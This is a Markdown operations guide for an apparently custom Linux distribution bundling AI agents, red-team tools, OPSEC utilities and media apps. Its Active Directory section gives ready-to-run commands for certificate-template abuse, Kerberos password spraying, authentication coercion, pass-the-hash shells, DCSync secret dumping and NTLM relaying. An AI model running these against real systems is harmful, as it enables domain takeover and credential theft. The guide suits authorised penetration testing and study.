# 🜂 ZOTHOS Linux: Sovereign Tools Matrix & Operational Guide 🜄

> *"As above, so below; as code, so mind."*

This guide provides operational workflows, CLI syntax, key bindings, and system integrations for the **25 Sovereign Tools** organized across the **5 Strategic Cadres** of ZOTHOS Linux, alongside the master CLI command hierarchy.

---

## ✦ Master Sovereign Matrix (25 Core Tools across 5 Cadres)

| Cadre | Focus Area | Sovereign Tools | Primary Command / Binary |
| :--- | :--- | :--- | :--- |
| **Cadre I** | **Frontier AI & Autonomous Synthesis** | 1. Zoth Studio v2 & Updater<br/>2. Nous Research Hermes Agent<br/>3. NullAI HexStrike AI Terminal<br/>4. Claude Code CLI<br/>5. OpenCode & Codex CLI<br/>6. Ollama Local LLM Engine<br/>7. ComfyUI Diffusion Forge | `zoth-studio` / `zoth-update-studio`<br/>`hermes`<br/>`hexstrike`<br/>`claude`<br/>`opencode` / `codex`<br/>`ollama`<br/>`comfyui` |
| **Cadre II** | **Active Directory & Enterprise Red Team** | 8. Certipy (AD CS Enumeration & Abuse)<br/>9. Kerbrute (Kerberos Pre-Auth Spraying)<br/>10. Coercer (RPC Authentication Coercion)<br/>11. PEASS-ng (linPEAS & winPEAS)<br/>12. BloodHound & Neo4j (Domain Graph)<br/>13. Impacket Protocol Suite | `certipy`<br/>`kerbrute`<br/>`coercer`<br/>`linpeas` / `winpeas`<br/>`bloodhound` / `neo4j`<br/>`impacket-*` |
| **Cadre III** | **Attack Surface & Next-Gen Web Recon** | 14. Subfinder (OSINT Subdomain Discovery)<br/>15. HTTPX (Multi-Purpose Probe & Tech Detect)<br/>16. Katana (Next-Gen Headless Crawler)<br/>17. Nuclei (Rule-Based Vulnerability Scanner)<br/>18. TruffleHog (Verified Secret Auditor)<br/>19. GoWitness (Headless Web Screenshotting)<br/>20. Caido (Fast Rust Intercepting Web Proxy) | `subfinder`<br/>`httpx`<br/>`katana`<br/>`nuclei`<br/>`trufflehog`<br/>`gowitness`<br/>`caido` |
| **Cadre IV** | **Sovereign OPSEC & Cryptographic Defense** | 21. Zoth Ghostmode (Tor + MAC + RAM Flush)<br/>22. Zoth NetKill (Panic Blackhole Switch)<br/>23. KeePassXC (Offline Encrypted Vault)<br/>24. VeraCrypt (Plausibly Deniable Volumes)<br/>25. OnionShare (Ephemeral Tor File/Chat) | `zoth-ghost`<br/>`zoth-netkill`<br/>`keepassxc`<br/>`veracrypt`<br/>`onionshare` |
| **Cadre V** | **Media, Audio & Terminal Mastery** | *Core:* Zoth Hermetic Audio Studio<br/>*Video:* Maya Linux Video Studio Pro<br/>*DevOps:* LazyGit & LazyDocker<br/>*Explorer:* Yazi Async File Manager<br/>*Network:* Doggo DNS & Trippy Diagnostic | `zoth-music`<br/>`maya`<br/>`lazygit` / `lazydocker`<br/>`yazi`<br/>`doggo` / `trip` |

---

## ✦ Cadre I: Frontier AI & Autonomous Synthesis

### 1. Zoth Studio v2 & One-Command Updater
The flagship visual environment for autonomous agents, WebGPU utilities, and multi-agent consensus. Built with Vite + React + Tailwind + Framer Motion.

```bash
# Launch Zoth Studio (starts local server and opens browser/app container at http://localhost:3000)
zoth-studio

# Launch as background daemon
zoth-studio --daemon

# Check for upstream updates from Git repository
zoth-update-studio --check

# Synchronize upstream, install dependencies, and rebuild with Vite
zoth-update-studio

# Force clean re-clone and full rebuild
zoth-update-studio --force

# Integration shortcuts:
zoth-studio --update
zoth-pkg update studio
```
*Desktop Launcher:* `Zoth Update Studio` (`zoth-update-studio.desktop`) on Desktop and Kickoff application menu.

### 2. Nous Research Hermes Agent
Autonomous AI agent framework with dynamic skill execution, multi-step planning, and shell integration.
```bash
# Run Hermes in interactive prompt mode
hermes

# Run Hermes with a specific model or prompt
hermes run "Audit local network interfaces and report open ports"
```

### 3. NullAI HexStrike AI Terminal
Neural-assisted offensive security terminal with real-time MITRE ATT&CK guidance and retro CRT shader UI.
```bash
# Launch HexStrike terminal workstation
hexstrike
```

### 4. Claude Code CLI
High-performance terminal coding assistant engineered by Anthropic for large-scale codebase editing, refactoring, and git operations.
```bash
# Launch Claude Code in current directory
claude

# Ask Claude to execute an instruction
claude "Review recent commits and run test suite"
```

### 5. OpenCode & Codex CLI
Open-source terminal agents providing direct integration with local and cloud coding LLMs.
```bash
# Launch OpenCode
opencode

# Launch Codex CLI
codex
```

### 6. Ollama & Local Inference
Zero-egress offline inference on CPU and NVIDIA/AMD GPU.
```bash
# Pull and execute a local model
ollama run llama3.3:70b
ollama run qwen2.5-coder:32b
```

### 7. ComfyUI Diffusion Forge
Modular node-based UI for Stable Diffusion, FLUX, and latent image manipulation.
```bash
# Launch ComfyUI service
comfyui
```

---

## ✦ Cadre II: Active Directory & Enterprise Red Team

### 8. Certipy (`certipy-ad`)
Active Directory Certificate Services (AD CS) enumeration, misconfiguration detection, and exploitation (ESC1 through ESC13).
```bash
# Enumerate all vulnerable certificate templates across domain
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable

# Request certificate abusing vulnerable ESC1 template
certipy req -u 'user@domain.local' -p 'Password123!' -dc-ip 10.10.10.10 \
    -ca 'CORP-CA' -template 'VulnerableTemplate' -upn 'administrator@domain.local'

# Authenticate with retrieved PFX and harvest NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 9. Kerbrute
Fast user enumeration and password spraying using Kerberos pre-authentication to avoid account lockouts.
```bash
# Enumerate valid domain usernames without lockouts
kerbrute userenum --dc 10.10.10.10 -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Password spray a single password against discovered users
kerbrute passwordspray --dc 10.10.10.10 -d domain.local valid_users.txt 'Autumn2026!'
```

### 10. Coercer
Coerce arbitrary Windows hosts into authenticating back to an attacker listener via 12+ RPC protocols.
```bash
# Coerce machine authentication (PetitPotam, ShadowCoerce, DFSCoerce)
coercer coerce -u 'user' -p 'password' -d 'domain.local' -l 10.10.10.5 -t 10.10.10.20
```

### 11. PEASS-ng (`linPEAS` & `winPEAS`)
Automated local privilege escalation scripts for Linux and Windows.
```bash
# Run linPEAS on current Linux system
linpeas

# Access packaged winPEAS executables and batches
ls -la /usr/share/peass/winpeas/
```

### 12. BloodHound & Neo4j
Visual graph-based attack path analysis for Active Directory and Azure environments.
```bash
# Start Neo4j graph database backend
sudo neo4j start

# Launch BloodHound visual interface
bloodhound
```

### 13. Impacket Protocol Suite
Complete collection of Python classes for working with network protocols (SMB, MSRPC, Kerberos, NTLM).
```bash
# Pass-the-hash remote shell
impacket-psexec -hashes :5f7173b8099e71239c065f426cbe0152 Administrator@10.10.10.20

# Dump domain secrets via DCSync
impacket-secretsdump 'domain.local/admin:Password123!@10.10.10.10'

# SMB and HTTP NTLM credential relaying
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## ✦ Cadre III: Attack Surface & Next-Gen Web Recon

### 14. Subfinder
Passive subdomain discovery aggregating over 40+ OSINT sources with no active probing.
```bash
subfinder -d target.com -all -o subdomains.txt
```

### 15. HTTPX
Multi-purpose HTTP toolkit for rapid probing, TLS fingerprinting, and technology detection.
```bash
httpx -l subdomains.txt -title -tech-detect -status-code -ip -o live_targets.txt
```

### 16. Katana
Next-generation web crawler and spidering framework with headless browser parsing and JavaScript rendering.
```bash
katana -list live_targets.txt -jc -d 3 -o endpoints.txt
```

### 17. Nuclei
Fast, template-based vulnerability scanner covering CVEs, misconfigurations, and web exposures.
```bash
nuclei -l live_targets.txt -severity critical,high -o vulnerabilities.txt
```

### 18. TruffleHog
Deep secret, token, and private key auditor with live validation against upstream provider APIs.
```bash
# Audit Git repository history for valid leaked tokens
trufflehog git file://./target-repo --only-verified

# Audit filesystem directory
trufflehog filesystem /opt/ --only-verified
```

### 19. GoWitness
Automated web screenshotting utility powered by headless Chromium.
```bash
# Capture screenshots of all discovered web services
gowitness file -f live_targets.txt --threads 4

# View screenshot gallery in local web dashboard
gowitness server --address 127.0.0.1:7171
```

### 20. Caido
Modern, fast, and resource-efficient web security inspection proxy written in Rust.
```bash
# Launch Caido daemon
caido
```

---

## ✦ Cadre IV: Sovereign OPSEC & Cryptographic Defense

### 21. Zoth Ghostmode
Military-grade amnesic operational security: transparent Tor traffic routing, automatic MAC address randomization, randomized hostname, and ephemeral RAM cache scrubbing.
```bash
# Enable Ghostmode routing and OPSEC hardening
zoth-ghost on

# Disable Ghostmode and restore standard interfaces
zoth-ghost off

# Or switch full desktop reality:
```

### 22. Zoth NetKill Panic Switch
Emergency killswitch that instantly drops all network interfaces and applies an iptables blackhole.
```bash
# Emergency disconnect:
zoth-netkill
```

### 23. KeePassXC Vault
Offline, high-security credential and password vault with YubiKey / hardware token support.
```bash
# Launch GUI
keepassxc

# Query secrets via CLI
keepassxc-cli show /path/to/vault.kdbx 'target-entry'
```

### 24. VeraCrypt Hidden Volumes
Plausibly deniable encrypted disk containers and system encryption.
```bash
# Launch GUI
veracrypt

# Mount volume via headless CLI mode
veracrypt -t -k "" --protect-hidden=no /media/secure.tc /mnt/secure
```

### 25. OnionShare & age
Anonymous peer-to-peer file transfer, private encrypted chat, and modern encryption.
```bash
# Host anonymous ephemeral chat over Tor
onionshare --chat

# Send a confidential document
onionshare /path/to/file.tar.gz

# Encrypt a file using modern age cryptography
age -r age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p payload.bin > payload.bin.age
```

---

## ✦ Cadre V: Media, Audio & Terminal Mastery

### Zoth Hermetic Audio Studio (`zoth-music`)
Dedicated desktop audio deck preloaded with classical focus and alchemical compositions (Satie, Chopin, Debussy, Bach) with a real-time Web Audio API spectrum visualizer and rotating 24K gold medallion.
```bash
# Launch Audio Studio deck
zoth-music
```

### Maya Linux Video Studio Pro (`maya`)
Creator video production suite with 3D device mockups (iPhone 17 Pro, MacBooks), high-fps screen capture, and kinetic subtitles.
```bash
maya
```

### LazyGit & LazyDocker
Interactive terminal management for Git and containers:
```bash
lazygit
lazydocker
```

### Yazi Async File Manager
Blazing fast terminal file navigator written in Rust with inline image preview:
```bash
yazi
```

### Doggo DNS & Trippy (`trip`)
Modern network diagnostic and DNS tools:
```bash
# Query DNS over HTTPS
doggo target.com @https://cloudflare-dns.com/dns-query

# Interactive real-time traceroute and ping diagnostics
trip target.com
```

---

## ✦ Operational Command Hierarchy

```bash
# 1. Flagship Graphical Studio
zoth-studio                 # Visual agent workbench (http://localhost:3000)
zoth-update-studio          # One-command upstream Git sync & Vite rebuild

# 2. Curses Operational Bridge
zoth-cockpit                # Headless system diagnostics & agent telemetry

# 3. Reality Switcher

# 4. Sovereign Package Provisioner
zoth-pkg verify             # Audit 213+ Kali/Parrot tool availability
zoth-pkg list               # List all curated tools across categories
zoth-pkg install <tool>     # Install missing tool or entire category
```
